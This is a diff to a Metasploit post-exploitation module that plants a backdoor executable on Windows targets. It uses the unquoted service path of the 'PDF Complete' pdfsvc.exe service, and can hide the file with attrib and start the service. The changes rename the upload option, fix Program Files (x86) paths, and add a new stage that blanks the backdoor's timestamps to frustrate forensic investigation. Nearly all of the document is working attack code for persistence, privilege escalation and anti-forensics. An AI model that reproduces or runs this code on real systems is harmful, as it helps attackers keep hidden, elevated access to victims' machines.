@@ -50,14 +50,15 @@
 #
 # [ MODULE OPTIONS ]
 # Input The session number to run this module on  => set SESSION 3
-# Input full path of Program.exe to be uploaded   => set UPLOAD_PATH /root/Program.exe
+# Input full path of Program.exe to be uploaded   => set LOCAL_PATH /root/Program.exe
 # Check pdfcDispatcher service auto-start status? => set SERVICE_STATUS true
 # use attrib to hidde your program.exe in target? => set HIDDEN_ATTRIB true
+# Blank remote backdoor timestomp attributs?      => set BLANK_TIMESTOMP true
 # ---------------------------------------------------------------------------------------
 # Deploy PDF.exe insted of Program.exe?           => set PDF_EXE true
 # WARNING: advanced option 'PDF_EXE' requires user to build one 'PDF.exe' payload and use
-# 'UPLOAD_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
-# examples: set UPLOAD_PATH /root/PDF.exe AND set PDF_EXE true AND exploit
+# 'LOCAL_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
+# examples: set LOCAL_PATH /root/PDF.exe AND set PDF_EXE true AND exploit
 # ---------------------------------------------------------------------------------------
 #
 # "WARNING: This module will not delete the payload deployed"
@@ -129,8 +130,8 @@ class MetasploitModule < Msf::Post
                                         # 'Special thanks:', # testing/debug module
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
-                        'DisclosureDate' => 'nov 17 2016',
+                        'Version'        => '$Revision: 1.4',
+                        'DisclosureDate' => 'nov 18 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',
@@ -158,8 +159,9 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('UPLOAD_PATH', [ false, 'The full path of Program.exe to be uploaded']),
+                                OptString.new('LOCAL_PATH', [ false, 'The full path of Program.exe to be uploaded']),
                                 OptBool.new('SERVICE_STATUS', [ false, 'Check remote pdfcDispatcher service settings?' , false]),
+                                OptBool.new('BLANK_TIMESTOMP', [ false, 'Blank remote backdoor timestomp attributs?' , false]),
                                 OptBool.new('HIDDEN_ATTRIB', [ false, 'Use Attrib command to Hide Program.exe?' , false])
                         ], self.class)
 
@@ -196,13 +198,13 @@ def ls_stage1
 
   r=''
   session = client
-  u_path = datastore['UPLOAD_PATH']
-  bin_path = "%programfiles%\\PDF Complete\\pdfsvc.exe"
+  u_path = datastore['LOCAL_PATH']
+  bin_path = "%programfiles(x86)%\\PDF Complete\\pdfsvc.exe"
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['UPLOAD_PATH'] == 'nil'
+  if datastore['LOCAL_PATH'] == 'nil'
     print_error("Options not configurated correctly...")
-    print_warning("Please set UPLOAD_PATH option!")
+    print_warning("Please set LOCAL_PATH option!")
     return nil
   else
     print_status("Deploying backdoor into target system!")
@@ -212,7 +214,7 @@ def ls_stage1
   # chose to deploy payload in C:\  -> [C:\Program.exe] OR ...
   # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
   if datastore['PDF_EXE'] == true
-   payload = "%programfiles%\\PDF.exe"
+   payload = "%programfiles(x86)%\\PDF.exe"
    shell = "PDF.exe"
   else
    payload = "C:\\Program.exe"
@@ -241,16 +243,6 @@ def ls_stage1
         # move payload to the rigth directory (unquoted service path)
         print_good("moving payload to #{payload}")
         r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{shell} #{payload}", nil, {'Hidden' => true, 'Channelized' => true})
-        # check if remote path exists?
-        if payload.nil?
-          print_error("ABORT: post-module cant find backdoor binary...")
-          print_error("Please check: #{payload}")
-          return
-        end
-
-        # Change payload timestamp (date:time)
-        print_good(" Blanking backdoor agent timestamp...")
-        client.priv.fs.blank_file_mace(payload)
         sleep(1.0)
 
           # start remote service ...
@@ -304,7 +296,7 @@ def ls_stage2
   # chose to deploy payload in C:\  -> [C:\Program.exe] OR ...
   # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
   if datastore['PDF_EXE'] == true
-   payload = "%programfiles%\\PDF.exe"
+   payload = "%programfiles(x86)%\\PDF.exe"
    shell = "PDF.exe"
   else
    payload = "C:\\Program.exe"
@@ -478,6 +470,66 @@ end
 
 
 
+# -------------------------------
+# BLANK BACKDOOR TIMESTOMP VALUES
+# -------------------------------
+def ls_stage4
+
+  r=''
+  session = client
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['BLANK_TIMESTOMP'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set BLANK_TIMESTOMP option!")
+    return nil
+  else
+    print_status("Blank backdoor timestamp attributes!")
+    sleep(1.5)
+  end
+
+
+  # to deploy payload in C:\Program Files (x86)  -> [C:\Program Files (x86)\PDF.exe]
+  if datastore['PDF_EXE'] == true
+   payload = "%programfiles(x86)%\\PDF.exe"
+   shell = "PDF.exe"
+  else
+   payload = "C:\\Program.exe"
+   shell = "Program.exe"
+  end
+
+
+    # check if backdoor.exe exist in target
+    if client.fs.file.exist?("#{payload}")
+      print_good(" Backdoor agent: #{shell} found!")
+      sleep(1.5)
+
+      # Change payload timestamp (date:time)
+      print_good(" Blanking backdoor agent timestamp...")
+      client.priv.fs.blank_file_mace("#{payload}")
+      sleep(1.5)
+
+        # diplay output to user
+        print_status("#{shell} timestomp successefully blanked!")
+        print_line("")
+
+      # close channel when done
+      r.channel.close
+      r.close
+
+    else
+      print_error("ABORT: post-module cant find backdoor agent path...")
+      print_error("BACKDOOR_AGENT: #{payload}")
+      print_line("")
+    end
+
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
+end
+
+
 
 # ------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
@@ -526,7 +578,7 @@ def run
 # ------------------------------------
 # Selected settings to run
 # ------------------------------------
-      if datastore['UPLOAD_PATH']
+      if datastore['LOCAL_PATH']
          ls_stage1
       end
 
@@ -536,6 +588,10 @@ def run
 
       if datastore['SERVICE_STATUS']
          ls_stage3
+      end
+
+      if datastore['BLANK_TIMESTOMP']
+         ls_stage4
       end
    end
 end
